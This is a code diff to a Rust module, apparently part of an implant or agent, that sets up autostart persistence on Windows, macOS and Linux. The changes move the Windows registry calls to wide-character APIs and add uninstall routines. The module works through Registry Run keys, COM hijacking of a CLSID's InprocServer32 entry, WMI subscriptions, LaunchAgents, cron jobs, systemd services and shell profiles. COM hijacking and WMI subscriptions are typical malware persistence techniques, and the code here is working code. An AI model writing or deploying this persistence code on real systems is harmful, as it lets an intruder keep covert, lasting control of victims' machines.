@@ -31,33 +31,33 @@ pub mod windows {
 
     impl Persist for RegistryRunKey {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            use winapi::um::winreg::{RegOpenKeyExA, RegSetValueExA, RegCloseKey, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::{KEY_WRITE, REG_SZ};
 
-            let run_key = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
             let val_str = executable_path.to_string_lossy().to_string();
-            let val_bytes = val_str.as_bytes();
-            let val_name = format!("{}\0", self.value_name);
+            let val_wide: Vec<u16> = val_str.encode_utf16().chain(std::iter::once(0)).collect();
+            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExA(
+                let ret = RegOpenKeyExW(
                     HKEY_CURRENT_USER,
-                    run_key.as_ptr() as _,
+                    run_key.as_ptr(),
                     0,
                     KEY_WRITE,
                     &mut hkey,
                 );
                 if ret != 0 {
-                    return Err(anyhow!("RegistryRunKey::install: RegOpenKeyExA failed: {}", ret));
+                    return Err(anyhow!("RegistryRunKey::install: RegOpenKeyExW failed: {}", ret));
                 }
-                RegSetValueExA(
+                RegSetValueExW(
                     hkey,
-                    val_name.as_ptr() as _,
+                    val_name.as_ptr(),
                     0,
                     REG_SZ,
-                    val_bytes.as_ptr(),
-                    val_bytes.len() as u32,
+                    val_wide.as_ptr() as _,
+                    (val_wide.len() * 2) as u32,
                 );
                 RegCloseKey(hkey);
             }
@@ -66,25 +66,25 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
-            use winapi::um::winreg::{RegOpenKeyExA, RegDeleteValueA, RegCloseKey, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegOpenKeyExW, RegDeleteValueW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_WRITE;
 
-            let run_key = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
-            let val_name = format!("{}\0", self.value_name);
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
+            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExA(
+                let ret = RegOpenKeyExW(
                     HKEY_CURRENT_USER,
-                    run_key.as_ptr() as _,
+                    run_key.as_ptr(),
                     0,
                     KEY_WRITE,
                     &mut hkey,
                 );
                 if ret != 0 {
-                    return Err(anyhow!("RegistryRunKey::remove: RegOpenKeyExA failed: {}", ret));
+                    return Err(anyhow!("RegistryRunKey::remove: RegOpenKeyExW failed: {}", ret));
                 }
-                RegDeleteValueA(hkey, val_name.as_ptr() as _);
+                RegDeleteValueW(hkey, val_name.as_ptr());
                 RegCloseKey(hkey);
             }
             log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
@@ -92,32 +92,32 @@ pub mod windows {
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winreg::{RegOpenKeyExA, RegQueryValueExA, RegCloseKey, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_READ;
 
-            let run_key = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";
-            let val_name = format!("{}\0", self.value_name);
-            let mut buf = vec![0u8; 512];
-            let mut buf_len = buf.len() as u32;
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
+            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
+            let mut buf = vec![0u16; 256];
+            let mut buf_len = (buf.len() * 2) as u32;
             let mut val_type: u32 = 0;
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                if RegOpenKeyExA(
+                if RegOpenKeyExW(
                     HKEY_CURRENT_USER,
-                    run_key.as_ptr() as _,
+                    run_key.as_ptr(),
                     0,
                     KEY_READ,
                     &mut hkey,
                 ) != 0 {
                     return Ok(false);
                 }
-                let ret = RegQueryValueExA(
+                let ret = RegQueryValueExW(
                     hkey,
-                    val_name.as_ptr() as _,
+                    val_name.as_ptr(),
                     ptr::null_mut(),
                     &mut val_type,
-                    buf.as_mut_ptr(),
+                    buf.as_mut_ptr() as _,
                     &mut buf_len,
                 );
                 RegCloseKey(hkey);
@@ -225,58 +225,57 @@ pub mod windows {
 
     impl Persist for ComHijacking {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, RegCloseKey, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::{KEY_WRITE, REG_SZ};
 
-            let subkey = format!(
+            let subkey: Vec<u16> = format!(
                 "Software\\Classes\\CLSID\\{}\\InprocServer32\0",
                 self.clsid
-            );
-            let val = executable_path.to_string_lossy().to_string();
-            let val_bytes = val.as_bytes();
+            ).encode_utf16().collect();
+            let val: Vec<u16> = executable_path.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
 
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegCreateKeyExA(
+                let ret = RegCreateKeyExW(
                     HKEY_CURRENT_USER,
-                    subkey.as_ptr() as _,
+                    subkey.as_ptr(),
                     0, ptr::null_mut(), 0, KEY_WRITE, ptr::null_mut(), &mut hkey, ptr::null_mut(),
                 );
                 if ret != 0 {
-                    return Err(anyhow!("ComHijacking::install: RegCreateKeyExA failed: {}", ret));
+                    return Err(anyhow!("ComHijacking::install: RegCreateKeyExW failed: {}", ret));
                 }
-                RegSetValueExA(hkey, ptr::null(), 0, REG_SZ, val_bytes.as_ptr(), val_bytes.len() as u32);
-                // Set ThreadingModel too
-                let tm_name = b"ThreadingModel\0";
-                let tm_val = b"Apartment\0";
-                RegSetValueExA(hkey, tm_name.as_ptr() as _, 0, REG_SZ, tm_val.as_ptr(), (tm_val.len() - 1) as u32);
+                RegSetValueExW(hkey, ptr::null(), 0, REG_SZ, val.as_ptr() as _, (val.len() * 2) as u32);
+                // Set ThreadingModel
+                let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
+                let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
+                RegSetValueExW(hkey, tm_name.as_ptr(), 0, REG_SZ, tm_val.as_ptr() as _, ((tm_val.len() - 1) * 2) as u32);
                 RegCloseKey(hkey);
             }
-            log::info!("ComHijacking::install: CLSID {} → '{}'", self.clsid, val);
+            log::info!("ComHijacking::install: CLSID {} → '{}'", self.clsid, executable_path.display());
             Ok(())
         }
 
         fn remove(&self) -> Result<()> {
-            use winapi::um::winreg::{RegDeleteTreeA, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};
 
-            let subkey = format!("Software\\Classes\\CLSID\\{}\0", self.clsid);
+            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid).encode_utf16().collect();
             unsafe {
-                RegDeleteTreeA(HKEY_CURRENT_USER, subkey.as_ptr() as _);
+                RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
             }
             log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            use winapi::um::winreg::{RegOpenKeyExA, RegCloseKey, HKEY_CURRENT_USER};
+            use winapi::um::winreg::{RegOpenKeyExW, RegCloseKey, HKEY_CURRENT_USER};
             use winapi::um::winnt::KEY_READ;
 
-            let subkey = format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid);
+            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid).encode_utf16().collect();
             unsafe {
                 let mut hkey = ptr::null_mut();
-                let ret = RegOpenKeyExA(
+                let ret = RegOpenKeyExW(
                     HKEY_CURRENT_USER,
-                    subkey.as_ptr() as _,
+                    subkey.as_ptr(),
                     0, KEY_READ, &mut hkey,
                 );
                 if ret == 0 {
@@ -332,6 +331,13 @@ pub mod windows {
         let wmi = WmiSubscription::default();
         let _ = wmi.install(&exe); // Best effort
 
+        Ok(exe)
+    }
+
+    pub fn uninstall_persistence() -> Result<PathBuf> {
+        let exe = std::env::current_exe()?;
+        let _ = RegistryRunKey::default().remove(); // best effort
+        let _ = WmiSubscription::default().remove(); // best effort
         Ok(exe)
     }
 }
@@ -476,6 +482,13 @@ pub mod macos {
             log::warn!("LaunchAgent install failed ({}); falling back to cron", e);
             CronJob.install(&exe)?;
         }
+        Ok(exe)
+    }
+
+    pub fn uninstall_persistence() -> Result<PathBuf> {
+        let exe = std::env::current_exe()?;
+        let _ = LaunchAgent::default().remove();
+        let _ = CronJob.remove();
         Ok(exe)
     }
 }
@@ -674,6 +687,14 @@ pub mod linux {
                 ShellProfile.install(&exe)?;
             }
         }
+        Ok(exe)
+    }
+
+    pub fn uninstall_persistence() -> Result<PathBuf> {
+        let exe = std::env::current_exe()?;
+        let _ = SystemdService::default().remove();
+        let _ = CronJob.remove();
+        let _ = ShellProfile.remove();
         Ok(exe)
     }
 }
